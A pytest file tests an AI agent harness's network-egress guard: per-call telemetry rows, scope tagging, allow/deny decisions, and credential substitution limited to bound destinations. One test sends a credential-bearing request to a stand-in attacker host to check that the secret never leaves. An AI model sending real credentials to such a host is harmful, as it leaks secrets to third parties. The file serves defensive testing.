"""#628 clause 1: every call through the four egress tools leaves exactly one
destination-tagged, scope-tagged, decision-tagged row in a table in the worker
job-queue database.

Telemetry is the item's step 1 and it is deliberately unconditional while
`enforce` is off: a default-deny allow-list is a list someone has to seed from
somewhere, and #628's own triage measured 240 distinct hosts in 14 days out of
session transcripts because nothing on the box had ever recorded a destination.
These tests pin the inventory's shape — one row per call, `scheme://host`, the
calling scope, and which of `allow` / `deny` / `grant-required` the policy said —
because a step-2 decision made on a table with the wrong grain is worse than the
missing table was.
"""

from __future__ import annotations

import asyncio
import datetime as dt
import json
import sqlite3

import pytest

from agent_mcp import egress
from agent_mcp import browser as browser_module
from agent_mcp import http_tools


@pytest.fixture
def db(tmp_path, monkeypatch):
    monkeypatch.setenv("LLOYD_EGRESS_DB", str(tmp_path / "workers.db"))
    monkeypatch.setenv("LLOYD_GRANT_DB", str(tmp_path / "workers.db"))
    monkeypatch.setattr(egress, "config",
                        lambda: {"telemetry": True, "enforce": False,
                                 "allow": [], "retention_days": 90})
    return tmp_path / "workers.db"


class StubClient:
    def __init__(self, status=200, text="<html><body>ok</body></html>"):
        self.calls: list[str] = []
        self._status = status
        self._text = text

    def __call__(self, *a, **k):
        return self

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def request(self, method, url, **kwargs):
        self.calls.append(f"{method} {url}")
        return http_tools.httpx.Response(
            self._status, request=http_tools.httpx.Request(method, url),
            headers={"content-type": "text/html"}, text=self._text)


@pytest.fixture
def socket(monkeypatch):
    client = StubClient()
    monkeypatch.setattr(http_tools, "make_sync_http_client", client)
    return client


@pytest.fixture
def no_browser(monkeypatch):
    async def _boom():
        raise AssertionError("Chromium was reached")

    monkeypatch.setattr(browser_module, "_get_page", _boom)


def rows(db) -> list[sqlite3.Row]:
    conn = sqlite3.connect(str(db))
    conn.row_factory = sqlite3.Row
    try:
        return list(conn.execute(
            "SELECT tool, destination, host, decision, session_id, worker_source,"
            " task_id, scope, reason, at, credentials FROM egress_events"
            " ORDER BY id"))
    except sqlite3.OperationalError:
        return []


# ── one row per tool, and the destination is scheme://host ──────────────────

def test_http_fetch_records_one_row_with_the_destination(socket, db):
    http_tools._http_fetch("https://Docs.Example.org/a/b?x=1#frag")

    (row,) = rows(db)
    assert row["tool"] == "http_fetch"
    assert row["destination"] == "https://docs.example.org", row["destination"]
    assert row["host"] == "docs.example.org"
    assert row["decision"] == "allow", row["decision"]
    assert row["at"], "an untimestamped row cannot be put in a 7-day window"


def test_http_request_records_its_own_row(socket, db):
    # Identity only — which tool, which destination, which host. It says nothing about
    # substitution and cannot: the call carries no header, so no swap could run at this
    # host, and asserting "the column stayed empty" here would be measuring a mechanism
    # that never had an input. Both directions that DO have one are pinned in the #3846
    # section, each asserting the binding on the destination its own row carries:
    # `test_a_substitution_writes_one_row_naming_credential_destination_decision` (bound
    # -> real value on the wire, record written) and
    # `test_an_unbound_destination_keeps_the_placeholder_and_still_writes` (unbound -> the
    # placeholder leaves unchanged, `out-of-binding` recorded).
    http_tools._http_request("POST", "http://api.internal-lab.test:8080/ingest",
                             body='{"k":1}')

    (row,) = rows(db)
    assert row["tool"] == "http_request"
    assert row["destination"] == "http://api.internal-lab.test"
    assert row["host"] == "api.internal-lab.test"


def test_http_search_records_the_backend_named_by_the_tool(socket, db):
    """`http_search` takes no url argument (`http_tools.py:111`), so nothing
    parseable exists at the call site — the tool names its own backend. Without
    this row the fleet's most-used web tool is invisible in the inventory that
    the seeded allow-list is derived from."""
    monkey_results = [{"title": "t", "href": "https://found.example/x",
                       "body": "b"}]
    class FakeDDGS:
        def text(self, query, max_results=5):
            return iter(monkey_results)
    import ddgs
    orig = ddgs.DDGS
    ddgs.DDGS = FakeDDGS
    try:
        http_tools._http_search("anything", 3)
    finally:
        ddgs.DDGS = orig

    (row,) = rows(db)
    assert row["tool"] == "http_search"
    assert row["destination"] == f"https://{egress.SEARCH_BACKEND_HOST}"
    assert row["decision"] == "allow"


def test_browser_navigate_records_one_row(no_browser, db, monkeypatch):
    """Refused before the launcher, and still one row: an unrecorded refusal is
    the invisible destination again."""
    monkeypatch.setattr(egress, "config",
                        lambda: {"telemetry": True, "enforce": True,
                                 "allow": [], "retention_days": 90})
    monkeypatch.setattr(egress, "_effect_scope", lambda: "item:youtube-digest:12")
    monkeypatch.setenv("LLOYD_BROWSER_BLOCK_PRIVATE", "0")

    out = json.loads(asyncio.run(
        browser_module._browser_navigate("https://watch.example.org/video")))

    assert "egress: refused browser_navigate" in out["error"]
    (row,) = rows(db)
    assert row["tool"] == "browser_navigate"
    assert row["destination"] == "https://watch.example.org"
    assert row["decision"] == "deny"


def test_one_call_leaves_one_row_even_when_the_call_fails_later(socket, db):
    """A 500 after the row is written is still a destination the fleet touched;
    a row written twice because the tool retried is an inventory that lies about
    volume, which is the number the tail-shape decision is made on."""
    http_tools._http_fetch("https://flaky.example.org/x", max_chars=99)
    http_tools._http_fetch("https://flaky.example.org/y", max_chars=99)

    got = rows(db)
    assert [r["destination"] for r in got] == ["https://flaky.example.org"] * 2


# ── the scope tags ──────────────────────────────────────────────────────────

def test_a_worker_turn_is_tagged_with_source_and_grant_scope(socket, db, monkeypatch):
    monkeypatch.setattr(egress, "_effect_scope", lambda: "item:domain-research:44")

    http_tools._http_fetch("https://journals.example.org/paper")

    (row,) = rows(db)
    assert row["worker_source"] == "domain-research"
    assert row["scope"] == "worker:domain-research"
    assert row["task_id"] == "", "a non-scheduled item has no autonomy task"


def test_a_scheduled_task_turn_is_tagged_with_its_task_id(socket, db, monkeypatch):
    monkeypatch.setattr(egress, "_effect_scope", lambda: "item:scheduled-task:4712")
    monkeypatch.setattr(egress, "_task_id_for_item", lambda item_id: "72")

    http_tools._http_fetch("https://arxiv.example.org/abs/1")

    (row,) = rows(db)
    assert row["worker_source"] == "scheduled-task"
    assert row["task_id"] == "72"
    assert row["scope"] == "autonomy-task:72"


def test_an_attended_turn_is_tagged_with_its_session(socket, db, monkeypatch):
    """Session id AND the attended fact. A human browsing is not a fleet scope,
    and the inventory must be able to tell the two apart or every per-source
    profile is polluted by whoever was reading the docs at the time."""
    monkeypatch.setattr(egress, "_session_id", lambda: "chat-session-abc")
    monkeypatch.setattr(egress, "_session_is_user", lambda sid: True)

    http_tools._http_fetch("https://docs.example.org/guide")

    (row,) = rows(db)
    assert row["session_id"] == "chat-session-abc"
    assert row["scope"] == "interactive", (
        "an attended turn is tagged with the interactive scope #534 defines, so "
        "the inventory can separate a human browsing from a fleet scope")
    assert row["decision"] == "grant-required", (
        "attended and outside policy is recorded, not refused")


def test_the_row_carries_the_caller_visible_reason_for_a_denial(socket, db, monkeypatch):
    """What the table is read for after the fact: which host, from where, and
    why — without re-running the call."""
    monkeypatch.setattr(egress, "config",
                        lambda: {"telemetry": True, "enforce": True,
                                 "allow": [], "retention_days": 90})
    monkeypatch.setattr(egress, "_effect_scope", lambda: "item:session-distill:5")

    http_tools._http_fetch("https://collector.example.net/p")

    (row,) = rows(db)
    assert row["decision"] == "deny"
    assert "grant_create(" in row["reason"], row["reason"]


def test_a_denied_destination_never_reaches_the_transport(socket, db, monkeypatch):
    monkeypatch.setattr(egress, "config",
                        lambda: {"telemetry": True, "enforce": True,
                                 "allow": [], "retention_days": 90})
    monkeypatch.setattr(egress, "_effect_scope", lambda: "item:domain-research:44")

    http_tools._http_fetch("https://collector.example.net/p")

    assert socket.calls == []
    assert rows(db)[0]["decision"] == "deny"


# ── the table is a table, in the queue's database ───────────────────────────

def test_the_table_lives_in_the_work_queue_database(db):
    """Same file as `runs`, different table — the reason the aggregator can write
    it without a queue singleton and the dashboard can read it without one."""
    from workers.queue import WorkQueue

    # One row from the guard, which creates its own table in the queue's file on
    # first write — the queue module owns the database, the egress module owns
    # this table, and neither imports the other's schema.
    WorkQueue(db)
    egress.guard("http_fetch", "https://example.org/x")
    conn = sqlite3.connect(str(db))
    tables = {r[0] for r in conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table'")}
    assert "egress_events" in tables and "runs" in tables, tables


def test_the_report_counts_per_destination_and_per_scope(db):
    for url in ("https://a.example.org/1", "https://a.example.org/2",
                "https://b.example.org/1"):
        egress.guard("http_fetch", url)

    report = egress.network_report()

    assert report["database_present"] is True
    assert report["total"] == 3
    assert report["distinct_hosts"] == 2
    by_host = {r["host"]: r for r in report["per_destination"]}
    assert by_host["a.example.org"]["count"] == 2
    assert by_host["b.example.org"]["count"] == 1
    (scope_row,) = [s for s in report["per_scope"] if s["scope"] == "(interactive/unscoped)"]
    assert scope_row["total"] == 3 and scope_row["distinct_hosts"] == 2
    assert report["by_decision"]["allow"] == 3


def test_the_report_names_its_zero_denominator_when_the_database_is_absent(tmp_path,
                                                                          monkeypatch):
    """`total: 0` because nothing was called and `total: 0` because the writer
    never ran are different states that look identical in a count."""
    monkeypatch.setenv("LLOYD_EGRESS_DB", str(tmp_path / "never-written.db"))

    report = egress.network_report()

    assert report["total"] == 0
    assert report["database_present"] is False, report
    assert report["database"].endswith("never-written.db")
    # #3549 clause 5: the flip's counts are present as zeros, not missing. A key that
    # appears only when there are rows makes an unwritten table read as "nothing would be
    # refused", which is the one misreading that could arm enforcement on a false clean.
    # The populated return builds its own literal, so this is the only node that fails if
    # the two drift apart.
    assert report["would_deny"] == 0, report
    assert report["floor_refused"] == 0, report
    assert report["per_source"] == [], report


def test_telemetry_off_writes_nothing(db, monkeypatch, socket):
    monkeypatch.setattr(egress, "config",
                        lambda: {"telemetry": False, "enforce": False,
                                 "allow": [], "retention_days": 90})

    http_tools._http_fetch("https://quiet.example.org/x")

    assert rows(db) == []
    assert egress.network_report()["total"] == 0


def test_the_report_window_excludes_rows_older_than_it(db):
    """Step 2 is a 7-day table read; a window that quietly includes everything
    would report last month's one-off host as current traffic."""
    egress.guard("http_fetch", "https://recent.example.org/x")
    conn = sqlite3.connect(str(db))
    conn.execute("UPDATE egress_events SET at='2020-01-01T00:00:00+00:00'")
    conn.commit()
    conn.close()

    report = egress.network_report(days=7)

    assert report["total"] == 0
    assert report["window_days"] == 7


def test_would_deny_and_floor_refused_honour_the_report_window(db, monkeypatch):
    """#3549 clause 4: the coverage counts age out exactly as `total` does.

    A `would_deny` that scanned the whole table instead of the window would keep reporting
    the same box as needing allow-list work long after the traffic that implied it had
    aged out, which is the difference between a 7-day figure a reviewer can act on and a
    permanent alarm. `floor_refused` is asserted beside it because the two are built by
    different code paths — one consults the allow entries, one does not — and both read the
    same `since` bound.

    Two rows are seeded rather than one so the per-source axis has a source to drop: an
    uncovered public destination (list miss) and a `127.0.0.1` call without the sanctioned
    flag (the floor's), both under a job scope so `worker_source` is populated.
    """
    monkeypatch.setattr(egress, "_effect_scope", lambda: "item:domain-research:99")
    egress.guard("http_fetch", "https://recent.example.org/x")   # uncovered, public
    egress.guard("http_request", "http://127.0.0.1:8080/x")      # the floor's

    before = egress.network_report(days=7)
    assert (before["total"], before["would_deny"], before["floor_refused"]) == (
        2, 2, 1), before

    conn = sqlite3.connect(str(db))
    conn.execute("UPDATE egress_events SET at='2020-01-01T00:00:00+00:00'")
    conn.commit()
    conn.close()

    aged = egress.network_report(days=7)
    assert aged["total"] == 0, aged
    assert aged["would_deny"] == 0 and aged["floor_refused"] == 0, aged
    assert aged["per_source"] == [], (
        "the per-source axis is built over the same window, so an aged-out row must not "
        "leave a job claiming refusals that no longer count")


def test_permanent_allow_entries_are_counted_rather_than_hidden(db):
    """The item's acceptance asks for the count of permanent unbounded entries,
    not a claim that there are none."""
    monkeypatch_allow = [
        {"host": "duckduckgo.com", "reason": "search backend"},
        {"host": "docs.example.org", "reason": "reviewed",
         "expires_at": (dt.datetime.now(dt.timezone.utc)
                        + dt.timedelta(days=30)).isoformat()},
    ]
    assert egress.count_permanent_entries(monkeypatch_allow) == 1


# ── #3846: the credential substitution rides on the same row ────────────────

class HeaderStubClient(StubClient):
    """A stub that records the headers actually handed to the transport.

    The question these nodes ask is what went OUT, not what the caller built, so a
    stub that ignores `kwargs` — the one above, which is right for its own nodes —
    could not answer it.
    """

    def __init__(self, *a, **k):
        super().__init__(*a, **k)
        self.header_calls: list[dict] = []

    def request(self, method, url, **kwargs):
        self.header_calls.append(dict(kwargs.get("headers") or {}))
        return super().request(method, url, **kwargs)


@pytest.fixture
def headers_socket(monkeypatch):
    client = HeaderStubClient()
    monkeypatch.setattr(http_tools, "make_sync_http_client", client)
    return client


CRED = "LIVEKIT_API_SECRET"


@pytest.fixture
def registry(tmp_path, monkeypatch):
    """A vault registry binding one credential to one destination.

    The credential NAME is a real vaulted one so `name_of_placeholder` recognises
    its placeholder, and the VALUE is a fixture string rather than a real secret:
    these nodes are about which bytes the gate sends, and nothing here needs the
    box's actual tokens.
    """
    import json
    from app.harness import credential_store as cs
    path = tmp_path / "credentials.json"
    path.write_text(json.dumps({"credentials": {
        CRED: {"destinations": ["https://bound.example.org"]}}}),
        encoding="utf-8")
    monkeypatch.setattr(cs, "store_path", lambda: path)
    monkeypatch.setattr(cs, "real_value",
                        lambda name: "REAL-FIXTURE-VALUE" if name
                        == CRED else None)
    return path


def test_a_substitution_writes_one_row_naming_credential_destination_decision(
        headers_socket, registry, db):
    """Clause 5: the swap and the destination land on ONE row.

    The item's reason for putting substitution on this table rather than a new one
    is that the question an auditor asks is whether the credential and the
    destination ever disagreed — which needs them in the same record.
    """
    from app.harness import credential_store as cs
    ph = cs.placeholder_for(CRED)
    http_tools._http_request("GET", "https://bound.example.org/v1/me",
                             headers={"Authorization": "Bearer " + ph})

    (row,) = rows(db)
    assert row["destination"] == "https://bound.example.org"
    # The binding is asserted on the destination THIS row carries, read back from the
    # registry: on a host no credential names, an `:applied` record would be true whether
    # or not the substitution path worked at all, and the node would be reporting its own
    # transport stub rather than the gate.
    assert cs.bound_for(CRED, row["destination"]), (
        "the fixture registry must bind this row's destination, or the pairing below is "
        "a coincidence rather than a mechanism")
    assert row["credentials"] == CRED + ":applied", (
        "the row does not name the credential and what the gate did with it")
    assert headers_socket.header_calls[-1]["Authorization"] == \
        "Bearer REAL-FIXTURE-VALUE", "the swap did not reach the transport"


def test_an_unbound_destination_keeps_the_placeholder_and_still_writes(
        headers_socket, registry, db):
    """The exfiltration case, measured: the placeholder is what leaves.

    A reader who pastes the same header at a host the credential is NOT bound to
    gets the dummy on the wire and a row that says `out-of-binding` — so the table
    can answer "was this credential ever spent somewhere it should not have been?"
    without the harness having refused anything (`enforce` is still off, #628's
    flip remains a human call).
    """
    from app.harness import credential_store as cs
    ph = cs.placeholder_for(CRED)
    http_tools._http_request("GET", "https://attacker.example.net/collect",
                             headers={"Authorization": "Bearer " + ph})

    from app.harness import credential_store as cs

    (row,) = rows(db)
    assert row["destination"] == "https://attacker.example.net"
    assert CRED + ":out-of-binding" == row["credentials"]
    assert headers_socket.header_calls[-1]["Authorization"] == "Bearer " + ph, (
        "a credential was substituted for an unbound destination — the binding is "
        "the whole control")
    assert "REAL-FIXTURE-VALUE" not in json.dumps(headers_socket.header_calls)


def test_a_call_with_no_placeholder_writes_an_empty_credentials_column(
        headers_socket, db):
    """The column stays empty rather than absent or NULL for every ordinary call.

    `enforce` is off and telemetry is unconditional, so this column is on the
    commonest row in the table; a NULL would make `WHERE credentials <> ''` miss
    rows in some readers and a default of `none` would make the "at least one real
    substitution row" acceptance check unreadable as a plain count.
    """
    http_tools._http_request("GET", "https://example.org/")
    (row,) = rows(db)
    assert row["credentials"] == ""


def test_an_existing_store_without_the_column_migrates_before_the_first_insert(
        tmp_path, monkeypatch):
    """The migration is not decoration: the live store already has rows.

    `CREATE TABLE IF NOT EXISTS` is a no-op on an existing table, so a build that
    only edited the schema string would have its INSERT fail on every guarded call
    and drop EVERY telemetry row through `_record`'s fail-open branch — while the
    tools kept working and the table quietly stopped growing. This node recreates
    the pre-#3844 table shape, runs one guarded call, and demands the row.
    """
    db = tmp_path / "legacy.db"
    monkeypatch.setenv("LLOYD_EGRESS_DB", str(db))
    monkeypatch.setattr(egress, "config",
                        lambda: {"telemetry": True, "enforce": False, "allow": [],
                                 "retention_days": 90})
    # A fresh process-level init cache for this file, so `_ensure` really runs
    # against a table that predates the column. Restored by monkeypatch.
    monkeypatch.setattr(egress, "_init_done", set())
    conn = sqlite3.connect(str(db))
    conn.executescript("""
        CREATE TABLE egress_events (
          id INTEGER PRIMARY KEY AUTOINCREMENT, at TEXT NOT NULL,
          tool TEXT NOT NULL, destination TEXT NOT NULL, host TEXT NOT NULL,
          decision TEXT NOT NULL, scope TEXT NOT NULL DEFAULT '',
          session_id TEXT NOT NULL DEFAULT '', worker_source TEXT NOT NULL DEFAULT '',
          task_id TEXT NOT NULL DEFAULT '', reason TEXT NOT NULL DEFAULT '');
        INSERT INTO egress_events (at, tool, destination, host, decision)
          VALUES ('2026-01-01T00:00:00+00:00','http_fetch','https://old.example','old.example','allow');
    """)
    conn.commit()
    conn.close()

    egress.guard("http_fetch", "https://migrate.example/x")

    conn = sqlite3.connect(str(db))
    conn.row_factory = sqlite3.Row
    try:
        live = list(conn.execute(
            "SELECT credentials, destination FROM egress_events ORDER BY id"))
    finally:
        conn.close()
    assert len(live) == 2, "the new row was lost — the fail-open branch swallowed it"
    assert live[0]["credentials"] == "", "the pre-existing row must not be rewritten"
    assert live[1]["destination"] == "https://migrate.example"


# ── #4012 clause 2: the aggregator states its own credential-substitution arm ──

def test_the_guard_publishes_whether_it_has_credentials_to_substitute(db, monkeypatch):
    """`GET /state`'s egress section carries the flag the #4012 canary arm refuses to run without.

    Three keys and not a fourth opinion: `enforce` and `telemetry` are what the guard
    acts on, and `credential_substitution` is whether this process has anything to
    substitute AT ALL — which the canary's escape verdict cannot be read without. A run
    against a daemon started with a bare environment records no secret in any argument
    for a reason that has nothing to do with the guard, and before this key existed the
    only way to notice was to know how the daemon had been started.
    """
    monkeypatch.setattr(egress.credential_store, "vaulted_names",
                        lambda: frozenset({"ANTHROPIC_API_KEY"}))
    st = egress.status()
    assert set(st) == {"enforce", "telemetry", "credential_substitution"}, st
    assert st["credential_substitution"] is True, st


def test_the_published_substitution_flag_is_the_stores_own_answer_not_a_restatement(db,
                                                                                   monkeypatch):
    """Read from the same call `substitute_headers` resolves a placeholder through.

    A second implementation of "am I substituting" inside `status()` would be a claim
    about the guard rather than a reading of it, and it would drift the first time the
    vault's emptiness rules moved. This node is the one that fails if `status()` ever
    grows its own env flag or its own copy of the emptiness logic.
    """
    calls = []

    def empty():
        calls.append("asked")
        return frozenset()

    monkeypatch.setattr(egress.credential_store, "vaulted_names", empty)
    assert egress.status()["credential_substitution"] is False
    assert calls == ["asked"], (
        "status() did not ask the store; it decided for itself")


def test_a_process_with_nothing_vaulted_publishes_the_flag_as_false(db, monkeypatch):
    """The empty vault is a state the daemon reports, not a run it refuses.

    `vaulted_names()` is empty when the registry will not open and the env file holds no
    secret-shaped name — the normal state of a gate worktree. `status()` publishes False
    and the RUN is refused by the caller; the daemon itself keeps serving, because it is
    the measurement that is uninterpretable here, not the tool call.
    """
    monkeypatch.setattr(egress.credential_store, "vaulted_names", frozenset)
    st = egress.status()
    assert st["credential_substitution"] is False, st
    assert st["enforce"] is False and st["telemetry"] is True, (
        "the two #2338 flags must not change shape when a third is added")


def test_the_substitution_state_survives_the_aggregators_state_route(db, monkeypatch):
    """The flag has to reach a client, not just the function that computes it.

    `agent_mcp/main.py` publishes `egress.status()` under `/state`'s `egress` key; a key
    dropped there is a key the canary cannot read, and the reading is the whole clause.
    Read from the shipped source because starting the aggregator in a unit test is not
    what this file does.
    """
    import pathlib

    assert egress.status().get("credential_substitution") is not None
    src = (pathlib.Path(egress.__file__).parent / "main.py").read_text(encoding="utf-8")
    route = [ln for ln in src.splitlines() if '"egress":' in ln]
    assert len(route) == 1, route
    # Handed to `asyncio.to_thread` rather than called inline, so the name appears
    # without parentheses — what matters is that the route runs THIS function and not a
    # hand-assembled dict that would have to be updated by hand whenever a flag is added.
    assert "egress.status" in route[0], route[0]
